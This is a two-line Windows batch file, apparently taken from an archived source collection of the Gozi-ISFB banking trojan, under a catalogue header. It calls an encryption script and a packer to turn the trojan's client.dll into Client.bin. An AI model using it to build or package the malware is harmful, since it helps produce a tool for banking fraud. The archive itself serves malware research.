:: ------------------------------------------------------------
:: name      Gozi-ISFB
:: type      trojan
:: cve       —
:: year      unknown
:: os        Windows
:: authors   unknown
:: source    RamadhanAmizudin/malware
:: archived  RamadhanAmizudin, krisyotam (2026)
:: notes     —
:: ------------------------------------------------------------
call %1\encrypts.bat %1 %2 client.dll
%1\appack.exe c %2\client.dll %2\Client.bin
